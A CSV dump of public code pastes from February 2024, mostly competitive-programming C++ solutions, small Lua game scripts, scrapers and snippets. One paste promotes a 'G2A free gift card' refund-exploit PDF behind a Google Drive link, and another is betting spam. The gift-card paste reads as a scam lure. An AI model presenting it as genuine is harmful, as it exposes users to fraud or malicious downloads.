id,title,username,language,date,content
ejkBRzfM,data850,TestGuy1,JSON,Saturday 24th of February 2024 06:00:12 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'a25ce40451342a3807ca8cbf8437362bbbc5bc7b805cf5835688d3be49ae614bd054d9c5fe1ad0cd3b52d8ab51366610d8c4a5871e56978527f89bf622baaa11af0b8915379dd8cde4ceb47647277196a110931f422ed330cf6c05ee9816137dc1347dc5c48c364cb6b7ffdd4927037bc9420cef61265fa6d5d3296af9665f3d',
  otherdata: [
    '452c9dd489f1b4397cf193e1f39f1f1b',
    'ebe3bfa813d4582d3df38f3ecf7d93f0',
    '1619019517df61755a52fe0928fdee3e',
    '412fe17c2ca790954124c9e4ddc7d449',
    '93a0a2d8abe6fbb083ef5b1ace58258c',
    'f8d3ebe1eebfe78e229648e4c8bf941b',
    '01271cbd73d452b3af5f65f490b364fe',
    'aa5a184b739d205bf422dd83367ad854'
  ]
}"
AcYek0Wv,Untitled,Josif_tepe,C++,Saturday 24th of February 2024 05:50:36 AM CDT,"#include <iostream>
#include <algorithm>
using namespace std;

int main() {
    int x;
    int koloni = 0;
    int dali_sme_ja_pominale_prvata_dvojka = -1;
    int vkupno = 0;
    while(cin >> x) {
        if(x == 1 and dali_sme_ja_pominale_prvata_dvojka == -1) {
            koloni++;
        }
        if(x == 2) {
            dali_sme_ja_pominale_prvata_dvojka = 1;
        }
        vkupno++;
        if(x == 3) {
            break;
        }
    }
    koloni--;
    int redovi = vkupno / koloni;
    
    cout << redovi << "" "" << koloni << endl;
    return 0;
}
"
zsgpgctp,Untitled,Rofyda_Elghadban1,C++,Saturday 24th of February 2024 05:50:02 AM CDT," void solve(){
  int n,k,idx=0,counter=0,counter1=0,num=0;
  cin>>n>>k;
  vector<int>a(n),b(n);
  cin(a);
  cin(b);
  vector<pair<int,pair<int,int>>>v;
  vector<pair<int,int>>ans;
  for(int i=0;i<n;i++){
    v.push_back({abs(b[i]),{b[i],a[i]}});
  }
  sort(all(v));
  int z=0;
  // for(int i=0;i<v.size();i++){
  //   cout<<v[i].first<<"" ""<<v[i].second.first<<"" ""<<v[i].second.second<<""\n"";
  // }
  // cout<<""\n"";
  for(int i=0;i<v.size();i++){
    if(z>0){
      if(v[i].second.second<=z){
        z-=v[i].second.second;
        v[i].second.second=0;
      }else{
        // ll m=v[i].second.second-z;
        v[i].second.second-=z;
        z=0;
      }
    }
    if(v[i].second.second>0&&v[i].second.second<=k){
      z+=(k-v[i].second.second);
      // k=k+(k-v[i].second.second);
      counter1++;
    }else if(v[i].second.second>0&&v[i].second.second>k){
      // if(counter==0){
      //   idx=i;
      //   counter++;
      // }
      if(v[i].second.first<0){
        num=v[i].second.first;
        v[i].second.first+=counter1;
        v[i].second.first++;
        ans.emplace_back(num,v[i].second.first);
      }else{
        num=v[i].second.first;
        v[i].second.first-=counter1;
        v[i].second.first--;
        ans.emplace_back(num,v[i].second.first);
      }
      counter1++;
    }
  }
  for(int i=0;i<ans.size();i++){
    cout<<ans[i].second<<"" ""<<ans[i].first<<""\n"";
    if(ans[i].first>0&&ans[i].second<=0){
      cout<<""NO""<<""\n"";
      return;
    }else if(ans[i].first<0&&ans[i].second>=0){
      cout<<""NO""<<""\n"";
      return;
    }
  }
  cout<<""YES""<<""\n"";
 }"
ewWyyUkr,G2A.com Free Gift Card Guide Feb 2024,ounnuo,GetText,Saturday 24th of February 2024 05:42:32 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_864301.pdf

Working as of:
24 February 2024"
45bjy8Tc,cd_exp6.c,Aravind_reddy10,C,Saturday 24th of February 2024 05:41:01 AM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct node
{
	int id;
	char var_name[30];
	char data_type[20];
	char value[30];
};

typedef struct node node;

node *table[100];
int top = 0;
int id = 1;

node *new_node(char *var_name, char *data_type, char *value)
{
	node *new = (node*)malloc(sizeof(node));
	new->id = id++;
	strcpy(new->var_name, var_name);
	strcpy(new->data_type, data_type);
	strcpy(new->value, value);
	return new;
}

int search(char *var_name)
{
	for(int i = 0; i < top; i++)
	{
		if(table[i] != NULL && strcmp(table[i]->var_name, var_name) == 0)
		{
			return 1;
		}
	}
	return 0;
}

void insert(node *new)
{
	table[top++] = new;
}

void delete(char *var_name)
{
	int deleted = 0;
	for(int i = 0; i < top; i++)
	{
		if(table[i] != NULL && strcmp(table[i]->var_name, var_name) == 0)
		{
			deleted = 1;
			free(table[i]);
			table[i] = NULL;
			break;
		}
	}
	if(deleted == 0)
	{
		printf(""not found\n"");
	}
}
void display()
{
	printf(""id\tvar_name\tdata_type\tvalue\n"");
	for(int i = 0; i < top; i++)
	{
		if(table[i] != NULL)
		{
			printf(""%d\t    %s\t\t  %s\t\t  %s\n"", table[i]->id, table[i]->var_name, table[i]->data_type, table[i]->value);
		}
	}
	printf(""\n"");
}
			

int main()
{
	for(int i = 0; i < 100; i++)
	{
		table[i] = NULL;
	}
	char var_name[30];
	char data_type[30];
	char value[30];
	
	int choice;
	while(1)
	{
		printf(""1.insert, 2.search, 3.delete, 4.display\n"");
		scanf(""%d"", &choice);
		if(choice > 4 || choice < 1)
		{
			return 0;
		}
		else if(choice == 1)
		{
			printf(""var name "");
			scanf(""%s"", var_name);
			if(search(var_name) == 1)
			{
				printf(""already declared\n"");
				continue;
			}
			printf(""data type "");
			scanf(""%s"", data_type);
			printf(""value "");
			scanf(""%s"", value);
			insert(new_node(var_name, data_type, value));
		}
		else if(choice == 2)
		{
			printf(""variable name "");
			scanf(""%s"", var_name);
			if(search(var_name))
			{
				printf(""found\n"");
			}
			else
			{
				printf(""not found\n"");
			}
		}
		else if(choice == 3)
		{
			printf(""variable name "");
			scanf(""%s"", var_name);
			delete(var_name);
		}
		else if(choice == 4)
		{
			display();
		}
		else
		{
			break;
		}
	}
	return 0;
}
"
0fwhsTFW,Untitled,Josif_tepe,C++,Saturday 24th of February 2024 05:37:31 AM CDT,"#include <iostream>
#include <algorithm>
using namespace std;

int main() {
    int n, x, y, v;
    cin >> n >> x >> y >> v;
    
    int tvrdina[n][n];
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < n; j++) {
            if(i % 2 == 0) {
                if(j % 2 == 0) {
                    tvrdina[i][j] = 0;
                }
                else {
                    tvrdina[i][j] = 1;
                }
            }
            else {
                if(j % 2 == 0) {
                    tvrdina[i][j] = 1;
                }
                else {
                    tvrdina[i][j] = 0;
                }
            }
        }
    }
    
    int titanik[n][n];
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < n; j++) {
            if(j < n - i) {
                titanik[i][j] = 1;
            }
            else {
                titanik[i][j] = 0;
            }
        }
    }
    
    if(v == titanik[y][x] and v == tvrdina[y][x]) {
        cout << 3 << endl;
    }
    else if(v == tvrdina[y][x]) {
        cout << 1 << endl;
    }
    else if(v == titanik[y][x]) {
        cout << 2 << endl;
    }
    else {
        cout << 4 << endl;
    }
    return 0;
}
"
D9DrbZbL,Untitled,den4ik2003,C++,Saturday 24th of February 2024 05:37:17 AM CDT,"#include <string>

#include <boost/log/core.hpp>
#include <boost/log/trivial.hpp>
#include <boost/log/expressions.hpp>
#include <boost/log/sinks/text_file_backend.hpp>
#include <boost/log/utility/setup/file.hpp>
#include <boost/log/utility/setup/common_attributes.hpp>
#include <boost/log/sources/severity_logger.hpp>
#include <boost/log/sources/record_ostream.hpp>

#include <mexc_spot/types.hpp>
#include <mexc_spot/errors.hpp>

namespace logging = boost::log;
namespace src = boost::log::sources;
namespace sinks = boost::log::sinks;
namespace keywords = boost::log::keywords;

namespace mira {

    namespace mexc_spot {

        class BaseMexcLogger { // дальше наследоваться будем скорее всего
        public:
            BaseMexcLogger() {
                logging::add_file_log(
                    keywords::file_name = SetAndGetLogPath(),
                    keywords::rotation_size = 300 * 1024 * 1024, // 300мб: потом внести в параметры (скорее всего размер от типа логгера будет зависеть)
                    keywords::time_based_rotation = sinks::file::rotation_at_time_point(0, 0, 0), // сброс в 00:00
                    keywords::format = ""[%TimeStamp%]: %Message%""
                );

                logging::core::get()->set_filter(
                    logging::trivial::severity < logging::trivial::info
                );
            }

        private:
            std::string& SetAndGetLogPath() {
                path_to_log_ = ""/usr/mnt/log/mock.log""; // TODO - ко времени привязаться + к типу логгера
                return path_to_log_;
            }

            std::string path_to_log_;
        };

    }

}"
6ErZKAKu,Untitled,Josif_tepe,C++,Saturday 24th of February 2024 05:13:34 AM CDT,"#include <iostream>
#include <algorithm>
using namespace std;

int main() {
    int p1, p2, p3;
    cin >> p1 >> p2 >> p3;
    
    int x = p2 - p1;
    if(p2 + x == p3) {
        cout << p3 + x << endl;
    }
    else {
        x = p2 / p1;
        cout << p3 * x << endl;
    }
    return 0;
}
"
wrN7MsQc,Untitled,35657,C++,Saturday 24th of February 2024 05:04:33 AM CDT,"#include <iostream>


using namespace std;

struct date {
	int day_;
	int month_;
	int year_;
};

class person {

public:
	person(const int id, const char* last_name, const char* first_name, const char* middle_name, const date birthday) : id_(id), last_name_(new char[strlen(last_name) + 1]), first_name_(new char[strlen(first_name) + 1]), middle_name_(new char[strlen(middle_name) + 1]), birthday_(birthday) {
		strcpy(last_name_, last_name);
		strcpy(first_name_, first_name);
		strcpy(middle_name_, middle_name);
		number_person_++;
	}

	person() : person(111111, ""Ivanov"", ""Ivan"", ""Ivanovich"", { 1,1,1993 }) {}

	person(const person& other) : person(other.id_, other.last_name_, other.first_name_, other.middle_name_, other.birthday_) {}

	void print() {
		cout << last_name_ << "" "" << first_name_ << "" "" << middle_name_ << "", "" << birthday_.day_ << '.' << birthday_.month_ << '.' << birthday_.year_ << "", id - "" << id_ << endl;
	}

	static int get_number_person() {
		return number_person_;
	}

	~person() {
		delete[] last_name_;
		delete[] first_name_;
		delete[] middle_name_;
		number_person_--;
	}

	void set_id(const int id) {
		id_ = id;
	}


	void set_last_name(const char* last_name) {
		delete[] last_name_;
		last_name_ = new char[strlen(last_name) + 1];
		strcpy(last_name_, last_name);
	}

	void set_first_name(const char* first_name) {
		delete[] first_name_;
		first_name_ = new char[strlen(first_name) + 1];
		strcpy(first_name_, first_name);
	}

	void set_middle_name(const char* middle_name) {
		delete[] middle_name_;
		middle_name_ = new char[strlen(middle_name) + 1];
		strcpy(middle_name_, middle_name);
	}

	void set_birthday(const int day, const int month, const int year) {
		birthday_.day_ = day;
		birthday_.month_ = month;
		birthday_.year_ = year;
	}

private:
	int id_; // идентификационный номер
	char* last_name_; // фамилия 
	char* first_name_; // имя
	char* middle_name_; // отчество
	date birthday_; // дата рождения
	static int number_person_;
};

int person::number_person_ = 0;

int main() {
	person p1(222222, ""Petrov"", ""Petr"", ""Petrovich"", {23,8,1997});

	cout << person::get_number_person() << endl;

	person p2;

	person p3(p1);

	cout << person::get_number_person() << endl;

	p1.print();
	p2.print();

	p3.set_id(333333);
	p3.set_last_name(""Sidorov"");
	p3.set_first_name(""Sidor"");
	p3.set_middle_name(""Sidorovich"");
	p3.set_birthday(11, 1, 1995);

	p3.print();

}"
gJq7fXnL,excavator,eirode,Lua,Saturday 24th of February 2024 05:00:42 AM CDT,"lo = 0
la = 0
ha = 0
boucle = true
cote = 0
cote_lo = 0
cote_la = 0

function dig_largeur()
    if turtle.detect() then
        turtle.dig()
    end
    turtle.forward()
    la = la + 1
    if la == (largeur - cote_la) then
        cote = cote + 1
        cote_la = cote_la + 1
        la = 0
        turtle.turnLeft()
    end
end

function dig_long()
    if turtle.detect() then
        turtle.dig()
    end
    turtle.forward()
    lo = lo + 1
    if lo == (longueur - cote_lo) then
        cote = cote + 1
        cote_lo = cote_lo + 1
        lo = 0
        turtle.turnLeft()
    end
end

function refuel()
    if turtle.getFuelLevel() < 6 then
        -- Check for fuel in inventory
        for i = 1, 16 do
            if turtle.getItemCount(i) > 0 then
                turtle.select(i)
                if turtle.refuel(1) then
                    break
                end
            end
        end
    end
    turtle.select(1)
end

print(""donnez la largeur à creuser"")
largeur = tonumber(read()) + 1
print(""donnez la longueur à creuser"")
longueur = tonumber(read())
print(""donnez la hauteur à creuser"")
hauteur = tonumber(read())

while boucle do
    print(""longueur creusée : "", lo)
    print(""largeur creusée : "", la)
    print(""hauteur creusée : "", ha)
    print(""cote creusée : "", cote)
    refuel()

    if cote == (largeur + longueur) then
        cote = 0
        ha = ha + 1
        if ha == hauteur then
            boucle = false
            break
        end
        if turtle.detectDown() then
            turtle.digDown()
        end
        turtle.down()
    elseif (cote % 2) == 0 then
        dig_largeur()
    elseif (cote % 2) == 1 then
        dig_long()
    end
end
"
PBppKkQf,Untitled,Josif_tepe,C++,Saturday 24th of February 2024 04:55:53 AM CDT,"#include <iostream>
#include <algorithm>
using namespace std;

int main() {
    int n, x, y, v;
    cin >> n >> x >> y >> v;
    
    int prv_tip[n][n];
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < n; j++) {
            if(i % 2 == 0) {
                if(j % 2 == 0) {
                    prv_tip[i][j] = 0;
                }
                else {
                    prv_tip[i][j] = 1;
                }
            }
            else {
                if(j % 2 == 0) {
                    prv_tip[i][j] = 1;
                }
                else {
                    prv_tip[i][j] = 0;
                }
            }
        }
    }
    
    int vtor_tip[n][n];
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < n; j++) {
            if(j < n - i) {
                vtor_tip[i][j] = 1;
            }
            else {
                vtor_tip[i][j] = 0;
            }
        }
    }
  
    if(v == prv_tip[y][x] and v == vtor_tip[y][x]) {
        cout << 3 << endl;
    }
    else if(v == prv_tip[y][x]) {
        cout << 1 << endl;
    }
    else if(v == vtor_tip[y][x]) {
        cout << 2 << endl;
    }
    else {
        cout << 4 << endl;
    }
    return 0;
}
"
5CGHZdMV,Embed Idee,jensie1996,JavaScript,Saturday 24th of February 2024 04:49:00 AM CDT,"let embed = new EmbedBuilder()
	.setAuthor({ name: messageReaction.message.embeds[0].author.name, iconURL: messageReaction.message.embeds[0].author.iconURL })
	.setColor(kleur)
	.setFields(
		{ name: 'Nieuw idee!', value: messageReaction.message.embeds[0].fields[0].value },
		{ name: 'Status:', value: status, inline: true },
		{ name: 'Toegevoegd:', value: messageReaction.message.embeds[0].fields[2].value, inline: true }
	)

messageReaction.message.edit({ embeds: [embed] });"
X4cJrnaA,harkinian,Synpase_X,Lua,Saturday 24th of February 2024 04:46:33 AM CDT,"local part = Instance.new(""Part"",game.Workspace)
part.Size = Vector3.new(1000, 30, 1000)
part.Position = Vector3.new(0, 0.5, 0)
part.Anchored = true
part.TopSurface = Enum.SurfaceType.Smooth
part.BrickColor = BrickColor.new(""Toothpaste"")

-- create decal
local decal = Instance.new(""Decal"")
decal.Face = Enum.NormalId.Top
decal.Parent = part

-- define faces
local happyFace = ""http://www.roblox.com/asset/?id=11503672257""

decal.Texture = happyFace"
LagQHs4F,Untitled,Josif_tepe,C++,Saturday 24th of February 2024 04:32:24 AM CDT,"#include <iostream>
#include <algorithm>
using namespace std;

int main() {
    int n, m;
    cin >> n >> m;
    int mat[n][m];
    
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            cin >> mat[i][j];
        }
    }
    
    int niza[n * m];
    int k = 0;
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            int najmal_element = 2000000000;
            if(i + 1 < n) { // postoi dolniot sosed
                if(najmal_element > mat[i + 1][j]) {
                    najmal_element = mat[i + 1][j];
                }
            }
            if(i - 1 >= 0) { // postoi gorniot sosed
                if(najmal_element > mat[i - 1][j]) {
                    najmal_element = mat[i - 1][j];
                }
            }
            if(j + 1 < m) { // postoi desniot sosed
                if(najmal_element > mat[i][j + 1]) {
                    najmal_element = mat[i][j + 1];
                }
            }
            if(j - 1 >= 0) { // postoi leviot sosed
                if(najmal_element > mat[i][j - 1]) {
                    najmal_element = mat[i][j - 1];
                }
            }
            if(najmal_element > mat[i][j]) {
                niza[k] = najmal_element - mat[i][j];
                k++;
            }
        }
    }
    if(k == 0) {
        cout << -1 << endl;
    }
    else {
        sort(niza, niza + k);
        for(int i = k - 1; i >= 0; i--) {
            cout << niza[i] << "" "";
        }
    }
    return 0;
}
"
cTrkXGky,Untitled,Gigo_G,C++,Saturday 24th of February 2024 04:03:17 AM CDT,"#include <bits/stdc++.h>
using namespace std;
typedef signed long long ll;

const ll MAXN = 2*1e5 + 7;
const ll MAXC = 1e12 + 7;
const ll MAXH = 1e6 + 7;

ll n, c;
vector<ll> h;

ll dp[MAXN];

deque<pair<ll, ll>> q;

double i(const pair<ll, ll>& a, const pair<ll, ll> b){ /// interesect
    return ((double)(b.second - a.second))/(a.first - b.first);
}
double e(const pair<ll, ll>& line, double x){ /// evaluate
    return line.first * x  + line.second;
}

void add(pair<ll, ll> nw){
    if(q.size() < 2){ q.push_back(nw); return; }
    pair<ll, ll> a = q.back();
    pair<ll, ll> b = *prev(q.end(), 2);
    while(q.size() >= 2 && (i(a, b) > i(b, nw))){
        q.pop_back();
        a = b;
        b = *prev(q.end(), -2);
    }
    q.push_back(nw);
}
ll query(double x){
    if(q.size() < 2){ return e(q.front(), x); }
    pair<ll, ll> a = q.front();
    pair<ll, ll> b = *next(q.begin());
    while(q.size() >= 2 && i(a, b) < x){
        q.pop_front();
        a = b;
        b = *next(q.begin());
    }
    return e(q.front(), x);
}

int main(){
    cin >> n >> c;
    h.resize(n);
    for(ll i = 0; i < n; i++){
        cin >> h[i];
    }

    for(ll i = 0; i < n; i++){
///        h[i]*h[i] - 2*h[i]*h[j] + h[j]*h[j] + dp[j] + c;
        if(i == 0){ dp[i] = 0; }
        else{
            dp[i] = query(h[i]) + h[i]*h[i] + c;
        }

        pair<ll, ll> newLine = {-2*h[i], h[i]*h[i] + dp[i]};
        add(newLine);
    }

    cout << dp[n-1] << '\n';

    return 0;
}
"
ag90KRgM,Soccer Prediction Betting Tips 24022024,livebetpro,PHP,Saturday 24th of February 2024 03:35:22 AM CDT,https://www.livebetpro.com/soccer-prediction-betting-tips-24022024/
hLRFpcPz,main.py,Dragon1573,Python,Saturday 24th of February 2024 03:31:57 AM CDT,"from asyncio import create_task, run, sleep
from os.path import dirname, join

from aiofiles import open
from httpx import AsyncClient
from lxml.etree import HTML
from mimesis import Internet

BASE_PATH = join(dirname(__file__), ""book"")


async def main():
    INET = Internet()
    async with AsyncClient(headers={""User-Agent"": INET.user_agent()}, http2=True) as client:
        response = await client.get(""https://www.xsobiquge.org/book/118960/"")
        dom = HTML(response.text)

        # 以下好像会触发这个站的反爬虫检测
        for href in dom.xpath(""//dd/a/@href""):
            await sleep(1)  # 暂时设置1秒，不行的话把它拉长
            response = await client.get(response.url.join(href))
            dom = HTML(response.text)
            contents = dom.xpath(""//div[@id='content']/text()"")
            filename = response.url.path.rsplit(""/"", 1)[-1].replace(""html"", ""txt"")
            async with open(join(BASE_PATH, filename)) as file:
                await file.writelines(contents)


if __name__ == ""__main__"":
    run(main())
"
Xkc4HcF0,test,Synpase_X,Lua,Saturday 24th of February 2024 03:23:03 AM CDT,"player = game.Workspace.FrameTamerFan
backpack = game.Players.FrameTamerFan.Backpack
tool = Instance.new(""Tool"",backpack)
handle = Instance.new(""MeshPart"",tool)
handle.Name = ""Handle""
pg = game.Players.FrameTamerFan.PlayerGui
sc = Instance.new(""ScreenGui"",pg)
wtf = Instance.new(""TextButton"")
wtf.Name = ""perish""
wtf.Parent = sc
wtf.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
wtf.Position = UDim2.new(0.0714285746, 0, 0.216000006, 0)
wtf.Size = UDim2.new(0, 79, 0, 31)
wtf.Font = Enum.Font.GothamBold
wtf.Text = ""perish""
wtf.TextColor3 = Color3.fromRGB(0, 0, 0)
wtf.TextScaled = true
wtf.TextSize = 14.000
wtf.TextWrapped = true

wtf4 = Instance.new(""TextButton"")
wtf4.Name = ""perish4""
wtf4.Parent = sc
wtf4.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
wtf4.Position = UDim2.new(0.1914285746, 0, 0.516000006, 0)
wtf4.Size = UDim2.new(0, 79, 0, 31)
wtf4.Font = Enum.Font.GothamBold
wtf4.Text = ""play""
wtf4.TextColor3 = Color3.fromRGB(0, 0, 0)
wtf4.TextScaled = true
wtf4.TextSize = 14.000
wtf4.TextWrapped = true

wtf2 = Instance.new(""TextBox"")
wtf2.Name = ""perish2""
wtf2.Parent = sc
wtf2.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
wtf2.Position = UDim2.new(0.1914285746, 0, 0.216000006, 0)
wtf2.Size = UDim2.new(0, 79, 0, 31)
wtf2.Font = Enum.Font.GothamBold
wtf2.Text = ""name""
wtf2.TextColor3 = Color3.fromRGB(0, 0, 0)
wtf2.TextScaled = true
wtf2.TextSize = 14.000
wtf2.TextWrapped = true

wtf3 = Instance.new(""TextBox"")
wtf3.Name = ""perish3""
wtf3.Parent = sc
wtf3.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
wtf3.Position = UDim2.new(0.1914285746, 0, 0.316000006, 0)
wtf3.Size = UDim2.new(0, 79, 0, 31)
wtf3.Font = Enum.Font.GothamBold
wtf3.Text = ""rbxassetid://""
wtf3.TextColor3 = Color3.fromRGB(0, 0, 0)
wtf3.TextScaled = true
wtf3.TextSize = 14.000
wtf3.TextWrapped = true

whodis = wtf.Text;

whosdat = false;

wtf.MouseButton1Down:Connect(function()
whosdat = true;
end)

tool.Activated:Connect(function()
if whosdat == true then
explosion = Instance.new(""Explosion"",player)
explosion.BlastRadius = 10
explosion.ExplosionType = Enum.ExplosionType.Craters
explosion.Position = player.HumanoidRootPart.Position
explosion.DestroyJointRadiusPercent = 100
l = Instance.new(""Sound"",lol)
l.SoundId = ""rbxassetid://5962675351""
l.Volume = 100
l:Play()
wait(1)
player:Destroy()
whosdat = false;
end

lol = game.Workspace:FindFirstChild(whodis);

l = Instance.new(""Sound"",player)
l.SoundId = wtf3.Text
l.Volume = 100
l:Play()
wait(1)
--lol:Destroy()
end)"
NxtB267N,main.py,Dragon1573,Python,Saturday 24th of February 2024 02:48:41 AM CDT,"from asyncio import run

from httpx import AsyncClient
from lxml.etree import HTML
from mimesis import Internet


async def main():
    INET = Internet()
    async with AsyncClient(headers={""User-Agent"": INET.user_agent()}, http2=True) as client:
        response = await client.get(""https://www.31xiaoshuo.com/14/14627/"")
        dom = HTML(response.text)
        for idx, section in enumerate(dom.xpath(""//dd/a""), 1):
            print(section.text)


if __name__ == ""__main__"":
    run(main())
"
9M3resnH,Reveal Words,bAngelov,JavaScript,Saturday 24th of February 2024 02:04:07 AM CDT,"function solve(words,text){
    words = words.split("","");
    for (let word of words){
        text = text.replace('*'.repeat(word.trim().length), word.trim());
    }
    return text;
}"
Ekf6VdSb,solab1pb5,STANAANDREY,Bash,Saturday 24th of February 2024 01:14:31 AM CDT,"#!/bin/bash

if [ $# -ne 2 ]; then
    echo ""Usage: $0 <dir> <outfile>""
    exit 1
fi

dir=$1
ofile=$2

if [ ! -d $dir ]; then
    echo ""$dir isn't a dir""
    exit 1
fi

flist=$(find $dir -type f -name '*.txt')


for file in $flist
do
    cnt=$(wc -c $file | awk '{print $1}')
    echo ""$file: $cnt"" >> $ofile
done
"
YJDee6tM,C,Ankit_132,C++,Friday 23rd of February 2024 11:20:19 PM CDT,"#include <bits/stdc++.h>

using namespace std;

#define ll     long long
#define pb     push_back

int main()
{
    int t;
    cin>>t;
    while(t--)
    {
        int n, q;
        cin >> n >> q;

        vector<ll int> a(n);
        vector<ll int> pre(n), one(n);

        for(int i=0; i<n; i++)
        {
            cin >> a[i];
            pre[i] = a[i];
            one[i] = (a[i] == 1);
        }

        for(int i=1; i<n; i++)
        {
            pre[i] += pre[i - 1];
            one[i] += one[i - 1];
        }

        while (q--)
        {
            ll int l, r;
            cin >> l >> r;
            l--, r--;

            if (l == r)
            {
                cout<<""NO\n"";
                continue;
            }

            ll int sum = pre[r];
            ll int cnt = one[r];

            if(l > 0)
            {
                sum -= pre[l - 1];
                cnt -= one[l - 1];
            }

            sum -= 2 * cnt;

            ll int rem = r - l + 1 - cnt;

            if (sum >= rem)
                cout << ""YES\n"";
            else
                cout << ""NO\n"";
        }
    }
}
"
BwqraWvs,B,Ankit_132,C++,Friday 23rd of February 2024 11:18:14 PM CDT,"#include <bits/stdc++.h>

using namespace std;

#define ll     long long
#define pb     push_back

int main()
{
    int t;
    cin>>t;
    while(t--)
    {
        ll int n, k;
        cin >> n >> k;

        ll int a[n];
        for (int i = 0; i < n; i++)
            cin >> a[i];

        ll int b[n + 1] = {0};
        for (int i = 0; i < n; i++)
        {
            int x;
            cin >> x;
            b[abs(x)] += a[i];
        }

        int f = 1;
        ll int rem = 0;

        for (int i = 1; i <= n; i++)
        {
            int tmp = min(b[i], rem);
            b[i] -= tmp;
            rem -= tmp;
            if (b[i] > k)
                f = 0;
            else
                rem += k - b[i];
        }

        if(f)
            cout << ""YES\n"";
        else
            cout << ""NO\n"";
    }
}"
yNzcJpYz,A,Ankit_132,C++,Friday 23rd of February 2024 11:16:57 PM CDT,"#include <bits/stdc++.h>

using namespace std;

#define ll     long long
#define pb     push_back

int main()
{
    int t;
    cin>>t;
    while(t--)
    {
        int n;
        cin>>n;

        vector<int> a(n);
        for(auto &e: a)     cin>>e;

        int ans = 0;
        int one = 0;
        int cnt = count(a.begin(), a.end(), 1);

        for(auto e: a)
        {
            if(one)        ans += (e == 0);
            one += (e == 1);

            if(one == cnt)      break;
        }

        cout<<ans<<""\n"";
    }
}
"
jLXgkBrc,D,Ankit_132,C++,Friday 23rd of February 2024 11:13:41 PM CDT,"#include <bits/stdc++.h>

using namespace std;

#define ll     long long
#define _test   int _TEST; cin>>_TEST; while(_TEST--)
#define pb     push_back

const int N = 3e5 + 10;

ll a[N],cnt[N],ans[N];
ll pre[N];

ll sum(int l,int r)
{
    return pre[r]-pre[l-1];
}

bool ok(int l,int r)
{
    if(l==r)
        return 1;
    return
        cnt[r]-cnt[l]>0;
}

int main()
{
    int t;
    cin>>t;
    while(t--)
    {
        int n;
        cin>>n;
        for(int i=1;i<=n;i++)
        {
            cin>>a[i];
            pre[i]=a[i]+pre[i-1];
            cnt[i]=(a[i]!=a[i-1])+cnt[i-1];
            ans[i]=INT_MAX;
        }

        for(int i=1;i<=n;i++)
        {
            if(i>1&&a[i-1]>a[i])
                ans[i]=1;
            if(i<n&&a[i+1]>a[i])
                ans[i]=1;

            int l=1,r=i-1;
            while(l<=r)
            {
                ll md=(l+r)>>1;
                if(sum(md,i-1)>a[i]&&ok(md,i-1))
                    ans[i]=min(ans[i],i-md),l=md+1;
                else
                    r=md-1;
            }

            l=i+1,r=n;
            while(l<=r)
            {
                ll md=(l+r)>>1;
                if(sum(i+1,md)>a[i] && ok(i+1,md))
                    ans[i]=min(ans[i],md-i),r=md-1;
                else
                    l=md+1;
            }
        }

        for(int i=1;i<=n;i++)
        {
            if(ans[i]==INT_MAX)
                cout<<""-1\n"";
            else
                cout<<ans[i]<<""\n"";
        }
        cout<<""\n"";
    }
}"
4QV2QTjf,Untitled,35657,C++,Friday 23rd of February 2024 11:12:55 PM CDT,"#include <iostream>
#include <time.h>   // для time()
#include <stdlib.h> // для rand()

using namespace std;

int main() {

	setlocale(LC_ALL, ""ru"");

	srand(time(NULL));

	const int row = 5;

	const int col = 6;

	int arr[row][col];

	int type, count;

	cout << ""Введите 1 для сдвига вправо, 2 для сдвига влево, 3 для сдвига вниз, 4 для сдвига вверх: "";

	cin >> type;

	cout << ""Введите количество разрядов сдвига: "";

	cin >> count;											

	for (int i = 0; i < row; i++) { 
		for (int j = 0; j < col; j++) { 
			arr[i][j] = rand() % 100;
			cout << arr[i][j] << '\t';
		}
		cout << endl;
	}
	cout << endl << endl;

	if (type == 1) { // сдвиг массива вправо
		for (int n = 0; n < count % col; n++) {
			for (int i = 0; i < row; i++) {
				int temp = arr[i][col - 1]; 
				for (int j = col - 1; j > 0; j--) {
					arr[i][j] = arr[i][j - 1];
				}
				arr[i][0] = temp;
			}
		}
	}

	for (int i = 0; i < row; i++) {
		for (int j = 0; j < col; j++) {
			cout << arr[i][j] << '\t';
		}
		cout << endl;
	}
}"
KaLBAuKF,Image Parsing,benn-1956,GDScript,Friday 23rd of February 2024 10:17:40 PM CDT,"extends Node

var bit : int = 0
var img = Image.load_from_file(""res://lvl.png"")



func _ready():
	print_debug(""this is a test"")
	Gen_Lvl()

func check_pxl(x,y):
	if !img.get_pixel(x,y): #check self
		bit = 0
		if !img.get_pixel(x,y + 1): # check for pixel up
			bit += 1
			bit <<= 1
		else:
			bit <<= 1
		if !img.get_pixel(x,y -1): # check for pixel down
			bit += 1
			bit <<= 1
		else:
			bit <<= 1
		if !img.get_pixel(x - 1,y): # check for pixel left
			bit += 1
			bit <<= 1
		else:
			bit <<= 1
		if !img.get_pixel(x + 1,y): # check for pixel right
			bit += 1
		return bit
		
func Gen_Lvl():
	var img_size = img.get_size()
	print(img_size)
	for x in img_size.x:
		for y in img_size.y:
			var data = check_pxl(x,y)
			if data != null:
				print(""at "", x, "","", y, "" bit is "", data)
"
6jcrYiJe,Untitled,35657,C++,Friday 23rd of February 2024 09:59:50 PM CDT,"#include <iostream>
#include <time.h>

using namespace std;

int main() {

	setlocale(LC_ALL, ""ru"");

	const int row = 3; // количество строк

	const int col = 5; // количество столбцов

	int arr[row][col];

	srand(time(NULL));

	for (int i = 0; i < row; i++) { // индекс строки
		for (int j = 0; j < col; j++) { // индекс столбца
			arr[i][j] = rand() % 100;
			cout << arr[i][j] << '\t';
		}
		cout << endl;
	}

	int max = arr[0][0];

	for (int i = 0; i < row; i++) {
		for (int j = 0; j < col; j++) {
